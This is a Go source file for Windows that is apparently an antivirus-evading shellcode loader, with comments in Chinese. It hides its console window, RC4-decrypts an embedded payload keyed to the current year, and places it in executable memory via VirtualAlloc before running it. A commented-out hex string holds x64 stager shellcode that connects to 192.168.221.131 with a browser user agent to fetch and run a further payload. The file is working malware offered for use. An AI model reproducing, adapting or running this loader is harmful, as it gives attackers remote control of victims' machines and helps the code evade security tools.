package main

import (
	"crypto/rc4"
	"encoding/hex"
	"fmt"
	_ "fmt"
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"log"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

func ShowConsoleAsync(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func rc4decode(shellcode []byte, key []byte) []byte {
	cipher, err := rc4.NewCipher(key)
	if err != nil {
		log.Println(err)
	}
	decryptedBytes := make([]byte, len(shellcode))
	cipher.XORKeyStream(decryptedBytes, shellcode)
	return decryptedBytes
}

// 获取系统时间
func getCurrentYearAsBytes() []byte {
	currentTime := time.Now()

	// 获取当前年份
	currentYear := currentTime.Year()

	// 将年份转换为字符串
	yearStr := strconv.Itoa(currentYear)

	// 将字符串转换为字节数组
	key := []byte(yearStr)

	return key
}

// 把shellcode转换为byte类型
func convertStringToByteSlice(str_text string) []byte {
	// 替换空格为逗号
	step1 := strings.ReplaceAll(str_text, " ", ",")

	// 替换方括号为花括号
	step2 := strings.ReplaceAll(step1, "[", "{")
	result := strings.ReplaceAll(step2, "]", "}")

	// 输入字符串，假设输入已经经过前面的转换，即：
	inputStr := result

	// 去掉花括号
	inputStr = strings.Trim(inputStr, "{}")

	// 分割字符串为各个数字字符串
	numStrs := strings.Split(inputStr, ",")

	// 创建一个字节切片来存储最终的字节数据
	byteSlice := make([]byte, len(numStrs))

	// 将每个数字字符串转换为字节
	for i, numStr := range numStrs {
		// 去掉多余的空格
		numStr = strings.TrimSpace(numStr)

		// 将字符串转换为十进制整数
		var value int
		fmt.Sscanf(numStr, "%d", &value)

		// 强制转换为字节并存储
		byteSlice[i] = byte(value)
	}

	return byteSlice
}

func main() {
	ShowConsoleAsync(w32.SW_HIDE)
	key := getCurrentYearAsBytes()
	str_text := "[239 166 8 183 113 78 184 2 225 155 238 171 4 39 1 214 156 85 90 15 69 208 100 231 6 121 81 133 90 126 173 79 42 72 6 117 89 225 247 52 95 132 254 113 14 101 98 119 97 49 66 89 1 150 19 85 134 177 170 232 76 227 33 37 171 44 165 227 131 53 92 9 154 146 133 78 74 238 26 28 28 60 107 223 37 154 28 159 160 134 7 125 201 90 205 96 84 196 77 168 17 157 250 160 236 133 89 78 73 129 42 211 148 50 59 90 215 40 7 207 45 113 100 64 108 224 32 53 240 67 35 91 200 252 214 199 119 65 98 132 56 88 188 111 86 56 20 50 10 119 254 240 132 49 245 30 235 165 154 94 251 97 97 203 137 102 162 145 128 51 142 81 142 184 14 164 167 179 48 171 243 148 146 16 73 21 64 199 154 209 230 226 25 51 127 71 127 29 134 72 33 7 216 65 93 138 241 197 3 107 120 100 90 205 5 44 199 241 211 250 185 19 82 195 120 200 33 119 99 62 99 16 172 216 53 6 202 89 133 157 107 164 93 43 176 39 216 192 60 57 91 48 112 72 2 250 128 10 83 97 109 56 88 176 87 84 255 218 93 196 96 102 233 209 90 227 107 30 188 95 236 86 119 245 58 67 95 25 93 222 229 248 56 183 99 40 94 134 79 148 247 226 130 213 0 125 89 27 215 191 51 29 170 136 158 37 149 61 152 7 86 14 91 250 1 139 77 53 236 91 63 113 161 15 122 179 156 108 158 11 55 91 49 85 131 94 91 133 158 215 161 123 130 39 103 190 208 33 161 6 194 40 158 11 62 74 14 81 63 252 197 221 204 6 179 107 221 114 149 244 93 93 235 161 210 254 57 60 219 205 190 88 216 126 98 147 238 159 184 185 3 184 149 210 193 123 208 23 216 189 105 223 2 226 184 109 62 200 247 196 127 177 65 204 169 255 195 216 215 81 242 182 104 244 166 222 28 16 17 183 238 29 9 201 43 33 249 93 70 120 240 214 38 176 69 121 99 91 98 103 87 224 139 41 249 16 159 65 234 146 138 161 169 75 146 8 93 114 245 69 252 19 98 4 222 21 101 60 176 15 190 255 1 219 214 65 105 28 83 170 175 243 84 97 114 70 55 166 170 196 26 139 222 89 7 157 84 214 214 248 73 71 119 62 216 1 224 39 112 89 52 175 227 229 21 124 183 129 137 35 40 144 126 34 81 24 23 189 69 55 120 229 55 66 106 245 5 196 222 197 84 223 205 131 30 254 240 169 190 231 204 47 220 153 44 9 222 72 72 101 11 196 151 144 168 198 162 33 200 221 105 195 131 244 4 111 230 144 93 203 100 186 101 200 38 36 136 60 61 25 59 129 15 227 35 130 213 5 69 185 27 247 87 46 227 99 72 204 43 249 180 215 148 204 175 25 171 177 142 57 11 45 60 155 14 213 11 93 41 180 59 98 230 96 211 73 225 44 118 199 190 41 28 239 234 86 166 12 81 222 22 129 136 59 139 138 242 28 189 40 40 143 192 107 179 47 235 16 13 248 21 105 6 119 231 244 108 12 31 18 240 230 229 24 237 83 35 233 140 140 140 162 37 27 172 89 149 192 204 196 31 211 3 193 109 53 76 199 235 102 109 91 199 81 39 213 148 244 123 49 148 5 200 181 22 9 79 99 159 95 224 151 53 246 196 176 145 191 253 12 181 185 66 136 17 200 75 15 6 235 128 209 34 241 90 139 205 44 195 33 180 220 97 249 32 170 59 205 139 4 82 79 196 229 235 233 187 116 93 22 76 14 122 140 235 252 220 82 125 85 189 4 60 6 4 51 253 232 230 59 147 26 104 194 32 33 5 202 253 242 239 45 61 7 158 14 108 119 97 252 184 187 172 28 124 34 105 222 238 15 88 130 81 19 133 230 172 164 9 241 103 94 99 171 109 225 60 76 156 10 85 22 150 245 217 117 250 254 52 220 68 79 107 230 57 121 173 33 238 96 204 16 209 227 204 71 73 36 117 15 225 161 84 228 0 123 116 105 43 75 218 192 106 238 108 40 108 4 237 155 135 111 153 105 79 255 132 135 189 23 19 77 165 178 233 123 70 115 230 236 195 246 176 42 125 27 217 140 182 168 10 125 58 129 177 69 188 154 212 233 37 59 38 192 137 219 19 48 131 36 122 48 130 143 61 44 129 156 121 162 89 222 75 218 76 84 80 177 4 24 86 203 232 50 166 250 146 209 10 113 102 69 255 208 240 183 221 133 55 64 185 147 240 90 46 127 173 163 103 147 111 38 246 81 21 7 56 4 193 50 163 214 186 192 0 212 107 159 219 209 234 52 133 125 192 75 136 189 203 98 124 210 204 39 186 7 8 193 251 131 164 99 136 144 188 147 201 126 81 209 112 140 177 182 71 56 92 44 250 194 229 74 210 220 108 192 20 63 246 253 223 76 118 159 21 208 237 93 206 94 99 200 134 237 187 137 107 160 111 240 188 125 217 44 80 219 200 60 201 203 19 106 167 147 75 132 159 135 244 190 237 206 140 97 47 237 236 9 79 156 134 216 27 79 40 240 122 49 9 110 15 28 93 129 15 157 181 2 147 232 114 146 81 238 238 69 133 73 144 159 234 68 247 0 231 195 222 97 182 183 237 82 189 39 208 101 225 172 18 101 55 202 221 149 46 98 180 160 180 120 56 170 175 118 125 196 153 115 58 13 136 118 58 137 254 164 226 33 122 93 162 91 43 41 233 68 216 24 233 138 98 97 219 212 3 57 81 124 130 9 12 158 115 163 220 203 75 92 91 50 11 239 235 110 175 235 35 78 183 200 110 226 115 145 166 132 160 155 102 227 5 78 34 109 137 53 14 236 213 77 213 176 113 208 87 19 53 241 235 154 88 62 64 210 198 221 153 193 98 190 173 9 160 177 72 230 218 75 127 56 198 217 234 242 50 159 246 197 16 64 134 215 102 63 220 229 43 181 86 124 217 114 223 6 215 141 156 61 198 113 103 254 205 84 1 156 35 97 253 214 76 151 172 85 217 69 58 180 208 249 253 235 23 38 96 147 153 17 98 6 28 75 95 234 145 138 22 219 153 185 168 112 174 165 131 58 49 34 187 116 120 12 151 198 104 125 95 53 21 162 225 249 39 102 150 116 15 7 40 215 184 227 100 143 40 113 153 21 197 187 121 132 224 120 0 222 91 183 156 55 164 159 144 113 17 224 84 83 89 8 83 141 86 115 241 23 183 106 245 214 216 190 15 137 155 152 171 188 25 104 250 44 153 192 125 88 95 56 205 65 81 97 31 101 237 116 242 82 93 238 158 77 46 253 95 113 63 202 64 194 246 120 197 222 142 52 191 45 30 234 240 31 10 214 194 118 164 148 139 139 102 202 107 251 8 183 3 55 191 238 113 183 35 100 143 168 100 178 93 217 168 251 99 25 30 228 63 182 98 28 114 12 70 217 3 204 126 84 8 201 156 39 27 245 231 6 162 48 232 125 251 118 210 1 235 28 179 242 175 72 112 214 248 140 126 104 207 228 202 135 250 252 128 69 229 23 84 165 207 232 84 69 108 26 174 214 105 253 130 114 198 203 4 204 218 231 89 236 142 39 12 211 134 32 169 205 30 187 131 26 126 193 188 204 92 111 234 196 68 207 183 228 195 164 56 240 56 181 85 154 39 111 221 224 129 52 136 199 30 110 254 27 54 182 172 36 156 96 40 66 130 189 73 136 14 81 118 15 3 100 250 30 78 67 24 198 187 34 44 25 12 135 187 178 75 192 160 169 49 105 9 120 131 62 120 71 83 221 158 7 254 127 71 91 108 76 26 190 220 158 36 249 82 191 9 49 116 105 212 124 149 76 251 36 244 140 58 122 86 210 183 13 211 234 113 159 114 120 77 0 213 166 127 35 224 147 44 45 142 115 120 254 224 97 128 135 144 173 105 53 190 137 19 91 123 60 131 150 73 222 195 39 40 105 93 167 58 210 155 47 119 72 194 202 102 250 166 20]"
	byteSlice := convertStringToByteSlice(str_text)
	//// 输出结果
	//fmt.Println("Byte slice:", byteSlice)

	//encode_str := []byte{239, 166, 8, 183, 113, 78, 184, 2, 225, 155, 238, 171, 4, 39, 1, 214, 156, 85, 90, 15, 69, 208, 100, 231, 6, 121, 81, 133, 90, 126, 173, 79, 42, 72, 6, 117, 89, 225, 247, 52, 95, 132, 254, 113, 14, 101, 98, 119, 97, 49, 66, 89, 1, 150, 19, 85, 134, 177, 170, 232, 76, 227, 33, 37, 171, 44, 165, 227, 131, 53, 92, 9, 154, 146, 133, 78, 74, 238, 26, 28, 28, 60, 107, 223, 37, 154, 28, 159, 160, 134, 7, 125, 201, 90, 205, 96, 84, 196, 77, 168, 17, 157, 250, 160, 236, 133, 89, 78, 73, 129, 42, 211, 148, 50, 59, 90, 215, 40, 7, 207, 45, 113, 100, 64, 108, 224, 32, 53, 240, 67, 35, 91, 200, 252, 214, 199, 119, 65, 98, 132, 56, 88, 188, 111, 86, 56, 20, 50, 10, 119, 254, 240, 132, 49, 245, 30, 235, 165, 154, 94, 251, 97, 97, 203, 137, 102, 162, 145, 128, 51, 142, 81, 142, 184, 14, 164, 167, 179, 48, 171, 243, 148, 146, 16, 73, 21, 64, 199, 154, 209, 230, 226, 25, 51, 127, 71, 127, 29, 134, 72, 33, 7, 216, 65, 93, 138, 241, 197, 3, 107, 120, 100, 90, 205, 5, 44, 199, 241, 211, 250, 185, 19, 82, 195, 120, 200, 33, 119, 99, 62, 99, 16, 172, 216, 53, 6, 202, 89, 133, 157, 107, 164, 93, 43, 176, 39, 216, 192, 60, 57, 91, 48, 112, 72, 2, 250, 128, 10, 83, 97, 109, 56, 88, 176, 87, 84, 255, 218, 93, 196, 96, 102, 233, 209, 90, 227, 107, 30, 188, 95, 236, 86, 119, 245, 58, 67, 95, 25, 93, 222, 229, 248, 56, 183, 99, 40, 94, 134, 79, 148, 247, 226, 130, 213, 0, 125, 89, 27, 215, 191, 51, 29, 170, 136, 158, 37, 149, 61, 152, 7, 86, 14, 91, 250, 1, 139, 77, 53, 236, 91, 63, 113, 161, 15, 122, 179, 156, 108, 158, 11, 55, 91, 49, 85, 131, 94, 91, 133, 158, 215, 161, 123, 130, 39, 103, 190, 208, 33, 161, 6, 194, 40, 158, 11, 62, 74, 14, 81, 63, 252, 197, 221, 204, 6, 179, 107, 221, 114, 149, 244, 93, 93, 235, 161, 210, 254, 57, 60, 219, 205, 190, 88, 216, 126, 98, 147, 238, 159, 184, 185, 3, 184, 149, 210, 193, 123, 208, 23, 216, 189, 105, 223, 2, 226, 184, 109, 62, 200, 247, 196, 127, 177, 65, 204, 169, 255, 195, 216, 215, 81, 242, 182, 104, 244, 166, 222, 28, 16, 17, 183, 238, 29, 9, 201, 43, 33, 249, 93, 70, 120, 240, 214, 38, 176, 69, 121, 99, 91, 98, 103, 87, 224, 139, 41, 249, 16, 159, 65, 234, 146, 138, 161, 169, 75, 146, 8, 93, 114, 245, 69, 252, 19, 98, 4, 222, 21, 101, 60, 176, 15, 190, 255, 1, 219, 214, 65, 105, 28, 83, 170, 175, 243, 84, 97, 114, 70, 55, 166, 170, 196, 26, 139, 222, 89, 7, 157, 84, 214, 214, 248, 73, 71, 119, 62, 216, 1, 224, 39, 112, 89, 52, 175, 227, 229, 21, 124, 183, 129, 137, 35, 40, 144, 126, 34, 81, 24, 23, 189, 69, 55, 120, 229, 55, 66, 106, 245, 5, 196, 222, 197, 84, 223, 205, 131, 30, 254, 240, 169, 190, 231, 204, 47, 220, 153, 44, 9, 222, 72, 72, 101, 11, 196, 151, 144, 168, 198, 162, 33, 200, 221, 105, 195, 131, 244, 4, 111, 230, 144, 93, 203, 100, 186, 101, 200, 38, 36, 136, 60, 61, 25, 59, 129, 15, 227, 35, 130, 213, 5, 69, 185, 27, 247, 87, 46, 227, 99, 72, 204, 43, 249, 180, 215, 148, 204, 175, 25, 171, 177, 142, 57, 11, 45, 60, 155, 14, 213, 11, 93, 41, 180, 59, 98, 230, 96, 211, 73, 225, 44, 118, 199, 190, 41, 28, 239, 234, 86, 166, 12, 81, 222, 22, 129, 136, 59, 139, 138, 242, 28, 189, 40, 40, 143, 192, 107, 179, 47, 235, 16, 13, 248, 21, 105, 6, 119, 231, 244, 108, 12, 31, 18, 240, 230, 229, 24, 237, 83, 35, 233, 140, 140, 140, 162, 37, 27, 172, 89, 149, 192, 204, 196, 31, 211, 3, 193, 109, 53, 76, 199, 235, 102, 109, 91, 199, 81, 39, 213, 148, 244, 123, 49, 148, 5, 200, 181, 22, 9, 79, 99, 159, 95, 224, 151, 53, 246, 196, 176, 145, 191, 253, 12, 181, 185, 66, 136, 17, 200, 75, 15, 6, 235, 128, 209, 34, 241, 90, 139, 205, 44, 195, 33, 180, 220, 97, 249, 32, 170, 59, 205, 139, 4, 82, 79, 196, 229, 235, 233, 187, 116, 93, 22, 76, 14, 122, 140, 235, 252, 220, 82, 125, 85, 189, 4, 60, 6, 4, 51, 253, 232, 230, 59, 147, 26, 104, 194, 32, 33, 5, 202, 253, 242, 239, 45, 61, 7, 158, 14, 108, 119, 97, 252, 184, 187, 172, 28, 124, 34, 105, 222, 238, 15, 88, 130, 81, 19, 133, 230, 172, 164, 9, 241, 103, 94, 99, 171, 109, 225, 60, 76, 156, 10, 85, 22, 150, 245, 217, 117, 250, 254, 52, 220, 68, 79, 107, 230, 57, 121, 173, 33, 238, 96, 204, 16, 209, 227, 204, 71, 73, 36, 117, 15, 225, 161, 84, 228, 0, 123, 116, 105, 43, 75, 218, 192, 106, 238, 108, 40, 108, 4, 237, 155, 135, 111, 153, 105, 79, 255, 132, 135, 189, 23, 19, 77, 165, 178, 233, 123, 70, 115, 230, 236, 195, 246, 176, 42, 125, 27, 217, 140, 182, 168, 10, 125, 58, 129, 177, 69, 188, 154, 212, 233, 37, 59, 38, 192, 137, 219, 19, 48, 131, 36, 122, 48, 130, 143, 61, 44, 129, 156, 121, 162, 89, 222, 75, 218, 76, 84, 80, 177, 4, 24, 86, 203, 232, 50, 166, 250, 146, 209, 10, 113, 102, 69, 255, 208, 240, 183, 221, 133, 55, 64, 185, 147, 240, 90, 46, 127, 173, 163, 103, 147, 111, 38, 246, 81, 21, 7, 56, 4, 193, 50, 163, 214, 186, 192, 0, 212, 107, 159, 219, 209, 234, 52, 133, 125, 192, 75, 136, 189, 203, 98, 124, 210, 204, 39, 186, 7, 8, 193, 251, 131, 164, 99, 136, 144, 188, 147, 201, 126, 81, 209, 112, 140, 177, 182, 71, 56, 92, 44, 250, 194, 229, 74, 210, 220, 108, 192, 20, 63, 246, 253, 223, 76, 118, 159, 21, 208, 237, 93, 206, 94, 99, 200, 134, 237, 187, 137, 107, 160, 111, 240, 188, 125, 217, 44, 80, 219, 200, 60, 201, 203, 19, 106, 167, 147, 75, 132, 159, 135, 244, 190, 237, 206, 140, 97, 47, 237, 236, 9, 79, 156, 134, 216, 27, 79, 40, 240, 122, 49, 9, 110, 15, 28, 93, 129, 15, 157, 181, 2, 147, 232, 114, 146, 81, 238, 238, 69, 133, 73, 144, 159, 234, 68, 247, 0, 231, 195, 222, 97, 182, 183, 237, 82, 189, 39, 208, 101, 225, 172, 18, 101, 55, 202, 221, 149, 46, 98, 180, 160, 180, 120, 56, 170, 175, 118, 125, 196, 153, 115, 58, 13, 136, 118, 58, 137, 254, 164, 226, 33, 122, 93, 162, 91, 43, 41, 233, 68, 216, 24, 233, 138, 98, 97, 219, 212, 3, 57, 81, 124, 130, 9, 12, 158, 115, 163, 220, 203, 75, 92, 91, 50, 11, 239, 235, 110, 175, 235, 35, 78, 183, 200, 110, 226, 115, 145, 166, 132, 160, 155, 102, 227, 5, 78, 34, 109, 137, 53, 14, 236, 213, 77, 213, 176, 113, 208, 87, 19, 53, 241, 235, 154, 88, 62, 64, 210, 198, 221, 153, 193, 98, 190, 173, 9, 160, 177, 72, 230, 218, 75, 127, 56, 198, 217, 234, 242, 50, 159, 246, 197, 16, 64, 134, 215, 102, 63, 220, 229, 43, 181, 86, 124, 217, 114, 223, 6, 215, 141, 156, 61, 198, 113, 103, 254, 205, 84, 1, 156, 35, 97, 253, 214, 76, 151, 172, 85, 217, 69, 58, 180, 208, 249, 253, 235, 23, 38, 96, 147, 153, 17, 98, 6, 28, 75, 95, 234, 145, 138, 22, 219, 153, 185, 168, 112, 174, 165, 131, 58, 49, 34, 187, 116, 120, 12, 151, 198, 104, 125, 95, 53, 21, 162, 225, 249, 39, 102, 150, 116, 15, 7, 40, 215, 184, 227, 100, 143, 40, 113, 153, 21, 197, 187, 121, 132, 224, 120, 0, 222, 91, 183, 156, 55, 164, 159, 144, 113, 17, 224, 84, 83, 89, 8, 83, 141, 86, 115, 241, 23, 183, 106, 245, 214, 216, 190, 15, 137, 155, 152, 171, 188, 25, 104, 250, 44, 153, 192, 125, 88, 95, 56, 205, 65, 81, 97, 31, 101, 237, 116, 242, 82, 93, 238, 158, 77, 46, 253, 95, 113, 63, 202, 64, 194, 246, 120, 197, 222, 142, 52, 191, 45, 30, 234, 240, 31, 10, 214, 194, 118, 164, 148, 139, 139, 102, 202, 107, 251, 8, 183, 3, 55, 191, 238, 113, 183, 35, 100, 143, 168, 100, 178, 93, 217, 168, 251, 99, 25, 30, 228, 63, 182, 98, 28, 114, 12, 70, 217, 3, 204, 126, 84, 8, 201, 156, 39, 27, 245, 231, 6, 162, 48, 232, 125, 251, 118, 210, 1, 235, 28, 179, 242, 175, 72, 112, 214, 248, 140, 126, 104, 207, 228, 202, 135, 250, 252, 128, 69, 229, 23, 84, 165, 207, 232, 84, 69, 108, 26, 174, 214, 105, 253, 130, 114, 198, 203, 4, 204, 218, 231, 89, 236, 142, 39, 12, 211, 134, 32, 169, 205, 30, 187, 131, 26, 126, 193, 188, 204, 92, 111, 234, 196, 68, 207, 183, 228, 195, 164, 56, 240, 56, 181, 85, 154, 39, 111, 221, 224, 129, 52, 136, 199, 30, 110, 254, 27, 54, 182, 172, 36, 156, 96, 40, 66, 130, 189, 73, 136, 14, 81, 118, 15, 3, 100, 250, 30, 78, 67, 24, 198, 187, 34, 44, 25, 12, 135, 187, 178, 75, 192, 160, 169, 49, 105, 9, 120, 131, 62, 120, 71, 83, 221, 158, 7, 254, 127, 71, 91, 108, 76, 26, 190, 220, 158, 36, 249, 82, 191, 9, 49, 116, 105, 212, 124, 149, 76, 251, 36, 244, 140, 58, 122, 86, 210, 183, 13, 211, 234, 113, 159, 114, 120, 77, 0, 213, 166, 127, 35, 224, 147, 44, 45, 142, 115, 120, 254, 224, 97, 128, 135, 144, 173, 105, 53, 190, 137, 19, 91, 123, 60, 131, 150, 73, 222, 195, 39, 40, 105, 93, 167, 58, 210, 155, 47, 119, 72, 194, 202, 102, 250, 166, 20, 241}
	d := rc4decode(byteSlice, key)
	//fmt.Printf("解密结果: %v \n", string(d))

	//_____________________________________________________
	//	code := "fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5eb735a4889c141b8570400004d31c9415141516a03415141ba57899fc6ffd5eb595b4889c14831d24989d84d31c9526800024084525241baeb552e3bffd54889c64883c3506a0a5f4889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebd3e9e4010000e8a2ffffff2f476539780066fdbb3485a5427193a199e7c0c1d9999467232ae4fb275b181521cc97f05e93c14665c5df90d345b09253751ff8dde17498d724c9ba04a7876d0183ddfa9b5b907385f1a3094c81d300557365722d4167656e743a204d6f7a696c6c612f352e302028636f6d70617469626c653b204d53494520392e303b2057696e646f7773204e5420362e313b2054726964656e742f352e303b20554853290d0a007e743b00227284ade2f11a6da5bfe19d65005512778e09eb27aad70f319f0a57fcc437a2433c42678909c2729982729e938e8e33ca3507aef26090c14ce3cd5771b360a985072318df519db54c095c6b8847ad11accbea25a0fcc7f9f8ebc8006d3c2ef72133f9e0189ca0a2f69622cf69951dc3ee487589fbee0ec32cc1cee71f48dfb924a5e09796f4a751e0ae1d1900c353c070ca89b84db6af0ac52b00962efab5f803ef530a21ba33ebb69cde43c19241e67265c0efbdb7ed26ad30daeef56ba87fc404b60efdefb4c30b4990d54858521c3b8d09003edbdccf0041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d758585848050000000050c3e89ffdffff3139322e3136382e3232312e313331003ade68b1 "

	//decode, _ := hex.DecodeString(code)
	decode, _ := hex.DecodeString(string(d))

	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	VirtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	// 分配内存并写入 shellcode 内容
	allocSize := uintptr(len(decode))
	mem, _, _ := VirtualAlloc.Call(0, allocSize, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, decode)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}